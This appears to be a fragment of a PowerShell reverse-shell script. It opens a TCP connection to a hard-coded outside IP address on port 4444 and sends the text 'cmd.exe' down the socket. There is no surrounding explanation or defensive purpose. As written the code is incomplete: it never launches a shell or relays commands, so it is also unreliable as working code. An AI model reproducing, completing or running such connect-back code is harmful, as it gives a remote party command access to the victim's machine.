$client = New-Object System.Net.Sockets.TCPClient("100.83.30.72", 4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;
$command = "cmd.exe";
$writer.WriteLine($command);
